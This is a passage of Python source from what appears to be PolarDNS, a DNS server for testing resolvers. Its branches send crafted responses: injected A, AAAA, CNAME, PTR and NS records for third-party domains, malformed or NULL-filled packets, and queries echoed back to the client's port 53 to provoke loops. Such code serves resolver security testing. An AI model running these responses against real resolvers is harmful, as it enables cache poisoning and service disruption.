              if "3rdparty" in req_domain_labels:  # inject a 3rd party domain
                 injdom = "injected03." + a3rdparty_domain
              else:
                 injdom = "injected03." + sld_tld_domain
              if "replq" in req_domain_labels:  # replace the question with our injected stuffs
                 orig_req_domain = req_domain
                 req_domain = injdom
                 addcustomlog("REPLQ")
              if "addq" in req_domain_labels:  # add additional question for our injected stuffs
                 resp_QURR = req_QURR+1
                 addedquestions  = convDom2Bin(injdom) + req_type_bin + req_class_bin
                 addcustomlog("ADDQ")
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', resp_QURR, 2, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              buffer += addedquestions
              ### ANSWER SECTION ########
              # A
              buffer += convDom2Bin(req_domain) + getTypeBin("A") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                ## TTL
              buffer += struct.pack(">H", 4)                        ## Data length
              buffer += socket.inet_aton(ip)                        ## IP
              # injected A
              buffer += convDom2Bin(injdom) + getTypeBin("A") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                ## TTL
              buffer += struct.pack(">H", 4)                        ## Data length
              buffer += socket.inet_aton(injip)                     ## IP
              # log and send
              log("A %s + A %s (%s)" % (ip, injdom, injip))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("inj04"):
              # Send 1 injected A record + 1 legit A record
              ip = "1.2.3.4"
              injip = "6.6.6.4"
              resp_QURR = req_QURR
              addedquestions = b''
              if "3rdparty" in req_domain_labels:  # inject a 3rd party domain
                 injdom = "injected04." + a3rdparty_domain
              else:
                 injdom = "injected04." + sld_tld_domain
              if "replq" in req_domain_labels:  # replace the question with our injected stuffs
                 orig_req_domain = req_domain
                 req_domain = injdom
                 addcustomlog("REPLQ")
              if "addq" in req_domain_labels:  # add additional question for our injected stuffs
                 resp_QURR = req_QURR+1
                 addedquestions  = convDom2Bin(injdom) + req_type_bin + req_class_bin
                 addcustomlog("ADDQ")
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', resp_QURR, 2, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              buffer += addedquestions
              ### ANSWER SECTION ########
              # injected A
              buffer += convDom2Bin(injdom) + getTypeBin("A") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                 ## TTL
              buffer += struct.pack(">H", 4)                         ## Data length
              buffer += socket.inet_aton(injip)                      ## IP
              # A
              buffer += convDom2Bin(req_domain) + getTypeBin("A") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                 ## TTL
              buffer += struct.pack(">H", 4)                         ## Data length
              buffer += socket.inet_aton(ip)                         ## IP
              # log and send
              log("A %s (%s) + A %s" % (injdom, injip, ip))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("inj05"):
              # In all sections, send some CNAME + also IP of it
              injip = "6.6.6.5"
              resp_QURR = req_QURR
              addedquestions = b''
              if "3rdparty" in req_domain_labels:  # inject a 3rd party domain
                 injdom = "injected05." + a3rdparty_domain
              else:
                 injdom = "injected05." + sld_tld_domain
              if "replq" in req_domain_labels:  # replace the question with our injected stuffs
                 orig_req_domain = req_domain
                 req_domain = injdom
                 addcustomlog("REPLQ")
              if "addq" in req_domain_labels:  # add additional question for our injected stuffs
                 resp_QURR = req_QURR+1
                 addedquestions  = convDom2Bin(injdom) + req_type_bin + req_class_bin
                 addcustomlog("ADDQ")
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', resp_QURR, 2, 2, 2)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              buffer += addedquestions
              ### ANSWER SECTION ########
              # CNAME
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                ## TTL
              buffer += struct.pack(">H", len(injdom)+2)            ## Data length
              buffer += convDom2Bin(injdom)                         ## CNAME value
              # injected A
              buffer += convDom2Bin(injdom) + getTypeBin("A") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                ## TTL
              buffer += struct.pack(">H", 4)                        ## Data length
              buffer += socket.inet_aton(injip)                     ## IP
              ### AUTHORITY SECTION ########
              # CNAME
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                ## TTL
              buffer += struct.pack(">H", len(injdom)+2)            ## Data length
              buffer += convDom2Bin(injdom)                         ## CNAME value
              # injected A
              buffer += convDom2Bin(injdom) + getTypeBin("A") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                ## TTL
              buffer += struct.pack(">H", 4)                        ## Data length
              buffer += socket.inet_aton(injip)                     ## IP
              ### ADDITIONAL SECTION ########
              # CNAME
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                ## TTL
              buffer += struct.pack(">H", len(injdom)+2)            ## Data length
              buffer += convDom2Bin(injdom)                         ## CNAME value
              # injected A
              buffer += convDom2Bin(injdom) + getTypeBin("A") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                ## TTL
              buffer += struct.pack(">H", 4)                        ## Data length
              buffer += socket.inet_aton(injip)                     ## IP
              # log and send
              log("CNAME %s + A %s (%s) in ALL sections" % (injdom, injdom, injip))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("inj06"):
              # Send some CNAME + also AAAA (IPv6) of it
              injip = "6666:6666:6666:6666:6666:6666:6666:6666"
              resp_QURR = req_QURR
              addedquestions = b''
              if "3rdparty" in req_domain_labels:  # inject a 3rd party domain
                 injdom = "injected06." + a3rdparty_domain
              else:
                 injdom = "injected06." + sld_tld_domain
              if "replq" in req_domain_labels:  # replace the question with our injected stuffs
                 orig_req_domain = req_domain
                 req_domain = injdom
                 addcustomlog("REPLQ")
              if "addq" in req_domain_labels:  # add additional question for our injected stuffs
                 resp_QURR = req_QURR+1
                 addedquestions  = convDom2Bin(injdom) + req_type_bin + req_class_bin
                 addcustomlog("ADDQ")
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', resp_QURR, 2, 2, 2)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              buffer += addedquestions
              ### ANSWER SECTION ########
              # CNAME
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)               ## TTL
              buffer += struct.pack(">H", len(injdom)+2)           ## Data length
              buffer += convDom2Bin(injdom)                        ## CNAME value
              # injected AAAA
              buffer += convDom2Bin(injdom) + getTypeBin("AAAA") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)               ## TTL
              buffer += struct.pack(">H", 16)                      ## Data length
              buffer += socket.inet_pton(socket.AF_INET6, injip)   ## IP
              ### AUTHORITY SECTION ########
              # CNAME
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)               ## TTL
              buffer += struct.pack(">H", len(injdom)+2)           ## Data length
              buffer += convDom2Bin(injdom)                        ## CNAME value
              # injected AAAA
              buffer += convDom2Bin(injdom) + getTypeBin("AAAA") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)               ## TTL
              buffer += struct.pack(">H", 16)                      ## Data length
              buffer += socket.inet_pton(socket.AF_INET6, injip)   ## IP
              ### ADDITIONAL SECTION ########
              # CNAME
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)               ## TTL
              buffer += struct.pack(">H", len(injdom)+2)           ## Data length
              buffer += convDom2Bin(injdom)                        ## CNAME value
              # injected AAAA
              buffer += convDom2Bin(injdom) + getTypeBin("AAAA") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)               ## TTL
              buffer += struct.pack(">H", 16)                      ## Data length
              buffer += socket.inet_pton(socket.AF_INET6, injip)   ## IP
              # log and send
              log("CNAME %s + AAAA %s (%s) in ALL sections" % (injdom, injdom, injip))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("inj07"):
              # Send only 1 injected A record
              injip = "6.6.6.7"
              resp_QURR = req_QURR
              addedquestions = b''
              if "3rdparty" in req_domain_labels:  # inject a 3rd party domain
                 injdom = "injected07." + a3rdparty_domain
              else:
                 injdom = "injected07." + sld_tld_domain
              if "replq" in req_domain_labels:  # replace the question with our injected stuffs
                 orig_req_domain = req_domain
                 req_domain = injdom
                 addcustomlog("REPLQ")
              if "addq" in req_domain_labels:  # add additional question for our injected stuffs
                 resp_QURR = req_QURR+1
                 addedquestions  = convDom2Bin(injdom) + req_type_bin + req_class_bin
                 addcustomlog("ADDQ")
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', resp_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              buffer += addedquestions
              ### ANSWER SECTION ########
              # injected A
              buffer += convDom2Bin(injdom) + getTypeBin("A") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                ## TTL
              buffer += struct.pack(">H", 4)                        ## Data length
              buffer += socket.inet_aton(injip)                     ## IP
              # log and send
              log("A %s (%s)" % (injdom, injip))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("inj08"):
              # Send only 1 injected A record in all sections
              injip = "6.6.6.8"
              resp_QURR = req_QURR
              addedquestions = b''
              if "3rdparty" in req_domain_labels:  # inject a 3rd party domain
                 injdom = "injected08." + a3rdparty_domain
              else:
                 injdom = "injected08." + sld_tld_domain
              if "replq" in req_domain_labels:  # replace the question with our injected stuffs
                 orig_req_domain = req_domain
                 req_domain = injdom
                 addcustomlog("REPLQ")
              if "addq" in req_domain_labels:  # add additional question for our injected stuffs
                 resp_QURR = req_QURR+1
                 addedquestions  = convDom2Bin(injdom) + req_type_bin + req_class_bin
                 addcustomlog("ADDQ")
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', resp_QURR, 1, 1, 1)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              buffer += addedquestions
              ### ANSWER SECTION ########
              # injected A
              buffer += convDom2Bin(injdom) + getTypeBin("A") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                ## TTL
              buffer += struct.pack(">H", 4)                        ## Data length
              buffer += socket.inet_aton(injip)                     ## IP
              ### AUTHORITY SECTION ########
              # injected A
              buffer += convDom2Bin(injdom) + getTypeBin("A") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                ## TTL
              buffer += struct.pack(">H", 4)                        ## Data length
              buffer += socket.inet_aton(injip)                     ## IP
              ### ADDITIONAL SECTION ########
              # injected A
              buffer += convDom2Bin(injdom) + getTypeBin("A") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                ## TTL
              buffer += struct.pack(">H", 4)                        ## Data length
              buffer += socket.inet_aton(injip)                     ## IP
              # log and send
              log("A %s (%s) in ALL sections" % (injdom, injip))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("inj09"):
              # Send only an injected PTR record in all sections
              injdom = "9.6.6.6.in-addr.arpa"
              resp_QURR = req_QURR
              cust_type_bin = req_type_bin  # question type (keep original "A", but we may replace it with "PTR")
              addedquestions = b''
              if "3rdparty" in req_domain_labels:  # inject a 3rd party domain
                 targetdom = "injected09." + a3rdparty_domain
              else:
                 targetdom = "injected09." + sld_tld_domain
              if "replq" in req_domain_labels:  # replace the question with our injected stuffs
                 orig_req_domain = req_domain
                 cust_type_bin = getTypeBin("PTR") # replace the question type
                 req_domain = injdom
                 addcustomlog("REPLQ")
              if "addq" in req_domain_labels:  # add additional question for our injected stuffs
                 resp_QURR = req_QURR+1
                 addedquestions  = convDom2Bin(injdom) + getTypeBin("PTR") + req_class_bin
                 addcustomlog("ADDQ")
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', resp_QURR, 1, 1, 1)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + cust_type_bin + req_class_bin
              buffer += addedquestions
              ### ANSWER SECTION ########
              # injected PTR
              buffer += convDom2Bin(injdom) + getTypeBin("PTR") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                ## TTL
              buffer += struct.pack(">H", len(targetdom)+2)         ## Data length
              buffer += convDom2Bin(targetdom)                      ## PTR
              ### AUTHORITY SECTION ########
              buffer += convDom2Bin(injdom) + getTypeBin("PTR") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                ## TTL
              buffer += struct.pack(">H", len(targetdom)+2)         ## Data length
              buffer += convDom2Bin(targetdom)                      ## PTR
              ### ADDITIONAL SECTION ########
              buffer += convDom2Bin(injdom) + getTypeBin("PTR") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                ## TTL
              buffer += struct.pack(">H", len(targetdom)+2)         ## Data length
              buffer += convDom2Bin(targetdom)                      ## PTR
              # log and send
              log("PTR %s -> %s in ALL sections" % (injdom, targetdom))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("inj10"):
              # Send no answer, but send a NS record in the Authority section for
              # another domain + IP of the NS in the Additional section
              injns = "ns1." + a3rdparty_domain
              injdom = sld_tld_domain
              resp_QURR = req_QURR
              addedquestions = b''
              if "3rdparty" in req_domain_labels:  # inject a 3rd party domain?
                 injdom  = a3rdparty_domain
                 injns   = "ns1." + sld_tld_domain
              injnsip = ZONEFILE[injns.lower()]["A"]
              if "replq" in req_domain_labels:  # replace the question with our injected stuffs?
                 orig_req_domain = req_domain
                 req_domain = injdom
                 addcustomlog("REPLQ")
              if "addq" in req_domain_labels:  # add additional question for our injected stuffs?
                 resp_QURR = req_QURR+1
                 addedquestions  = convDom2Bin(injdom) + req_type_bin + req_class_bin
                 addcustomlog("ADDQ")
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', resp_QURR, 0, 1, 1)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              buffer += addedquestions
              ### ANSWER SECTION ########
              ### none
              ### AUTHORITY SECTION ########
              buffer += convDom2Bin(injdom) + getTypeBin("NS") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)        ## TTL
              buffer += struct.pack(">H", len(injns)+2)     ## Data length
              buffer += convDom2Bin(injns)                  ## NS hostname
              ### ADDITIONAL SECTION ########
              buffer += convDom2Bin(injns) + getTypeBin("A") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)        ## TTL
              buffer += struct.pack(">H", 4)                ## Data length
              buffer += socket.inet_aton(injnsip)           ## IP
              # log and send
              log("empty + %s NS -> %s -> %s" % (injdom, injns, injnsip))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("inj11"):
              # Send no answer, but send a NS record in the Authority section for
              # another domain + IP of the NS in the Additional section
              injns = "ns1." + sld_tld_domain + "." + a3rdparty_domain
              injdom = a3rdparty_domain
              resp_QURR = req_QURR
              addedquestions = b''
              if "3rdparty" in req_domain_labels:  # inject a 3rd party domain
                 injns   = "ns1." + injdom + "." + sld_tld_domain
              injnsip = ZONEFILE[injns.lower()]["A"]
              if "replq" in req_domain_labels:  # replace the question with our injected stuffs
                 orig_req_domain = req_domain
                 req_domain = injdom
                 addcustomlog("REPLQ")
              if "addq" in req_domain_labels:  # add additional question for our injected stuffs
                 resp_QURR = req_QURR+1
                 addedquestions  = convDom2Bin(injdom) + req_type_bin + req_class_bin
                 addcustomlog("ADDQ")
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', resp_QURR, 0, 1, 1)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              buffer += addedquestions
              ### ANSWER SECTION ########
              ### empty
              ### AUTHORITY SECTION ########
              buffer += convDom2Bin(injdom) + getTypeBin("NS") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)        ## TTL
              buffer += struct.pack(">H", len(injns)+2)     ## Data length
              buffer += convDom2Bin(injns)                  ## NS hostname
              ### ADDITIONAL SECTION ########
              buffer += convDom2Bin(injns) + getTypeBin("A") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)        ## TTL
              buffer += struct.pack(">H", 4)                ## Data length
              buffer += socket.inet_aton(injnsip)           ## IP
              # log and send
              log("empty + %s NS -> %s -> %s" % (injdom, injns, injnsip))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("inj12"):
              # Send no answer, but send a NS record + IP of the NS in all sections
              injns = "ns1." + a3rdparty_domain
              injdom = sld_tld_domain
              resp_QURR = req_QURR
              addedquestions = b''
              if "3rdparty" in req_domain_labels:  # inject a 3rd party domain
                 injdom  = a3rdparty_domain
                 injns   = "ns1." + sld_tld_domain
              injnsip = ZONEFILE[injns.lower()]["A"]
              if "replq" in req_domain_labels:  # replace the question with our injected stuffs
                 orig_req_domain = req_domain
                 req_domain = injdom
                 addcustomlog("REPLQ")
              if "addq" in req_domain_labels:  # add additional question for our injected stuffs
                 resp_QURR = req_QURR+1
                 addedquestions  = convDom2Bin(injdom) + req_type_bin + req_class_bin
                 addcustomlog("ADDQ")
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', resp_QURR, 2, 2, 2)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              buffer += addedquestions
              ### ANSWER SECTION ########
              buffer += convDom2Bin(injdom) + getTypeBin("NS") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)        ## TTL
              buffer += struct.pack(">H", len(injns)+2)     ## Data length
              buffer += convDom2Bin(injns)                  ## NS hostname
              buffer += convDom2Bin(injns) + getTypeBin("A") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)        ## TTL
              buffer += struct.pack(">H", 4)                ## Data length
              buffer += socket.inet_aton(injnsip)           ## IP
              ### AUTHORITY SECTION ########
              buffer += convDom2Bin(injdom) + getTypeBin("NS") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)        ## TTL
              buffer += struct.pack(">H", len(injns)+2)     ## Data length
              buffer += convDom2Bin(injns)                  ## NS hostname
              buffer += convDom2Bin(injns) + getTypeBin("A") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)        ## TTL
              buffer += struct.pack(">H", 4)                ## Data length
              buffer += socket.inet_aton(injnsip)           ## IP
              ### ADDITIONAL SECTION ########
              buffer += convDom2Bin(injdom) + getTypeBin("NS") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)        ## TTL
              buffer += struct.pack(">H", len(injns)+2)     ## Data length
              buffer += convDom2Bin(injns)                  ## NS hostname
              buffer += convDom2Bin(injns) + getTypeBin("A") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)        ## TTL
              buffer += struct.pack(">H", 4)                ## Data length
              buffer += socket.inet_aton(injnsip)           ## IP
              # log and send
              log("%s NS -> %s -> %s in all sections" % (injdom, injns, injnsip))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("inj13"):
              # Send CNAME answer, and send a NS record + IP of the NS in all sections
              injns = "ns1." + sld_tld_domain
              injdom = a3rdparty_domain
              cnamedom = "injected13." + a3rdparty_domain
              resp_QURR = req_QURR
              addedquestions = b''
              if "3rdparty" in req_domain_labels:  # inject a 3rd party domain
                 injns   = "ns1." + a3rdparty_domain
              injnsip = ZONEFILE[injns.lower()]["A"]
              if "replq" in req_domain_labels:  # replace the question with our injected stuffs
                 orig_req_domain = req_domain
                 req_domain = injdom
                 addcustomlog("REPLQ")
              if "addq" in req_domain_labels:  # add additional question for our injected stuffs
                 resp_QURR = req_QURR+1
                 addedquestions  = convDom2Bin(injdom) + req_type_bin + req_class_bin
                 addcustomlog("ADDQ")
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', resp_QURR, 3, 2, 2)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              buffer += addedquestions
              ### ANSWER SECTION ########
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)        ## TTL
              buffer += struct.pack(">H", len(cnamedom)+2)  ## Data length
              buffer += convDom2Bin(cnamedom)               ## CNAME
              buffer += convDom2Bin(injdom) + getTypeBin("NS") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)        ## TTL
              buffer += struct.pack(">H", len(injns)+2)     ## Data length
              buffer += convDom2Bin(injns)                  ## NS hostname
              buffer += convDom2Bin(injns) + getTypeBin("A") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)        ## TTL
              buffer += struct.pack(">H", 4)                ## Data length
              buffer += socket.inet_aton(injnsip)           ## IP
              ### AUTHORITY SECTION ########
              buffer += convDom2Bin(injdom) + getTypeBin("NS") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)        ## TTL
              buffer += struct.pack(">H", len(injns)+2)     ## Data length
              buffer += convDom2Bin(injns)                  ## NS hostname
              buffer += convDom2Bin(injns) + getTypeBin("A") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)        ## TTL
              buffer += struct.pack(">H", 4)                ## Data length
              buffer += socket.inet_aton(injnsip)           ## IP
              ### ADDITIONAL SECTION ########
              buffer += convDom2Bin(injdom) + getTypeBin("NS") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)        ## TTL
              buffer += struct.pack(">H", len(injns)+2)     ## Data length
              buffer += convDom2Bin(injns)                  ## NS hostname
              buffer += convDom2Bin(injns) + getTypeBin("A") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)        ## TTL
              buffer += struct.pack(">H", 4)                ## Data length
              buffer += socket.inet_aton(injnsip)           ## IP
              # log and send
              log("CNAME %s + %s NS -> %s -> %s in all sections" % (cnamedom, injdom, injns, injnsip))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("inj14"):
              # Send only an injected CNAME record pointing to some other subdomain
              # in all sections, to see if it will try to resolve it or no
              resp_QURR = req_QURR
              addedquestions = b''
              if "3rdparty" in req_domain_labels:  # inject a 3rd party domain
                 injdom = "injected14." + a3rdparty_domain
              else:
                 injdom = "injected14." + sld_tld_domain
              targetdom = "always" + str(random.randint(1,100000)) + "." + sld_tld_domain
              if "replq" in req_domain_labels:  # replace the question with our injected stuffs
                 orig_req_domain = req_domain
                 req_domain = injdom
                 addcustomlog("REPLQ")
              if "addq" in req_domain_labels:  # add additional question for our injected stuffs
                 resp_QUESTIONS  = struct.pack(">H", noq+1)
                 addedquestions  = convDom2Bin(injdom) + req_type_bin + req_class_bin
                 addcustomlog("ADDQ")
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', resp_QURR, 1, 1, 1)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              buffer += addedquestions
              ### ANSWER SECTION ########
              # injected CNAME
              buffer += convDom2Bin(injdom) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                ## TTL
              buffer += struct.pack(">H", len(targetdom)+2)         ## Data length
              buffer += convDom2Bin(targetdom)                      ## CNAME
              ### AUTHORITY SECTION ########
              buffer += convDom2Bin(injdom) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                ## TTL
              buffer += struct.pack(">H", len(targetdom)+2)         ## Data length
              buffer += convDom2Bin(targetdom)                      ## CNAME
              ### ADDITIONAL SECTION ########
              buffer += convDom2Bin(injdom) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                ## TTL
              buffer += struct.pack(">H", len(targetdom)+2)         ## Data length
              buffer += convDom2Bin(targetdom)                      ## CNAME
              # log and send
              log("CNAME %s -> %s in ALL sections" % (injdom, targetdom))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("empty1"):
              # Send empty packet
              log("empty packet")
              if proto == "tcp":
                 send_buf_wo_len(self, b"")
              else:
                 send_buf(self, b"")
              #####################################################################
           elif first_label.startswith("empty2"):
              # Send arbitrary number of NULLs
              nulls = 1 # number of NULLs to send
              if req_domain_labels[1].isnumeric():
                 nulls = int(req_domain_labels[1])
              buffer = b"\x00" * nulls
              log("only %d NULL(s)" % (nulls))
              if proto == "tcp":
                 send_buf_wo_len(self, buffer)
              else:
                 send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("empty3"):
              # Send arbitrary number of NULLs with consideration for TCP mode.
              # In TCP there is length field in the beginning (2 bytes), so we must
              # provide proper length there
              nulls = 1 # number of NULLs to send
              if req_domain_labels[1].isnumeric():
                 nulls = int(req_domain_labels[1])
              buffer = b"\x00" * nulls
              if proto == "tcp":
                 log("only %d NULL(s) in TCP mode!" % (nulls))
              else:
                 log("only %d NULL(s)" % (nulls))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("empty4"):
              # Send the query ID + arbitrary number of NULLs
              nulls = 1 # number of NULLs to send
              if req_domain_labels[1].isnumeric():
                 nulls = int(req_domain_labels[1])
              buffer  = cust_ID
              buffer += b"\x00" * nulls
              log("only query ID and %d NULL(s)" % (nulls))
              if proto == "tcp":
                 if customlen != 0:
                    buffer  = struct.pack(">H", customlen)
                    buffer += cust_ID
                    buffer += b"\x00" * nulls
                    send_buf_wo_len(self, buffer)
                 else:
                    send_buf(self, buffer)
              else:
                 send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("empty5"):
              # Send the query ID + set in DNS header that there is an ANSWER
              # + send arbitrary number of NULLs
              nulls = 1 # number of NULLs to send
              if req_domain_labels[1].isnumeric():
                 nulls = int(req_domain_labels[1])
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ######## - no more
              buffer += b"\x00" * nulls
              # log and send
              log("only %d NULL(s) after the DNS header" % (nulls))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("empty6"):
              # Send back a normal looking DNS response, but remove the ANSWER SECTION
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ######## - missing
              # log and send
              log("remove ANSWER section")
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("empty7"):
              # Send back a normal DNS response, but ANSWER SECTION is just NULLs
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              # A                                      2                 2
              #tmp  = convDom2Bin(req_domain) + getTypeBin("A") + getClassBin("IN")
              #tmp += struct.pack(">L", customttl) #   4              ## TTL
              #tmp += struct.pack(">H", 4)         #   2              ## Data length
              #tmp += socket.inet_aton(ip)         #   4              ## IP
              #buffer += tmp
              buffer += b"\x00" * (len(convDom2Bin(req_domain)) + 14)
              # log and send
              log("replacing ANSWER section with NULLs")
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("close"):
              # Close the connection
              log("just closing connection")
              time.sleep(customsleep)
              close_conn(self)
              #####################################################################
           elif first_label.startswith("timeout"):
              # Timeout the connection
              log("sending nothing (timeout)")
              timeout_conn(self)
              #####################################################################
           elif first_label.startswith("queryback1"):
              # Domain starts with "queryback1", let's send back the same query
              buffer = cust_ID + req_RAW[2:]
              # log and send
              log("sending back the same query")
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("queryback2"):
              # Domain starts with "queryback2", let's send back the same query - stripped, with only
              # the question without any additional sections (like e.g. the OPT / EDNS0)
              ### DNS header ########
              buffer = prep_dns_header(req_FLAGS, req_QURR, 0, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              # log and send
              log("sending back the same query - stripped")
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("queryback3"):
              # Domain starts with "queryback3", let's send back the same query to the sender
              # to udp/53 port, as an attempt to make a loop.
              # Don't send any response to the original query (let it timeout)
              buffer = cust_ID + req_RAW[2:]
              log("sending back the same query to udp port 53")
              # send back the query to port udp 53
              s = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
              s.sendto(buffer, ((self.client_address[0], 53)))
              # don't send anything back in this connection
              timeout_conn(self)
              #####################################################################
           elif first_label.startswith("queryback4"):
              # Domain starts with "queryback4", let's send back a random variant of the query
              # to the sender to udp/53 port, as an attempt to make a loop.
              # Don't send any response to the original query (let it timeout)
              # Todo
              buffer = cust_ID + req_RAW[2:]
              log("sending back the same query to udp port 53")
              # send back the query to port udp 53
              s = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
              s.sendto(buffer, ((self.client_address[0], 53)))
              # just close the original connection, don't send anything there
              close_conn(self)
              #####################################################################
           elif req_domain == "version.polar" and req_type_str == "TXT" and req_class_str == "CH":
              # Version
              v = "PolarDNS " + version
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              # A
              buffer += convDom2Bin(req_domain) + getTypeBin("TXT") + getClassBin("CH")
              buffer += struct.pack(">L", customttl)        ## TTL
              buffer += struct.pack(">H", len(v)+1)         ## Data length
              buffer += convData2Bin(v.replace(".", "<DOT>"))
              # log and send
              log("Version %s" % (v))
              send_buf(self, buffer)
           else:
              # Otherwise send not found (NXDOMAIN)
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x03', req_QURR, 0, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              # log and send empty answer
              log("NXDOMAIN")
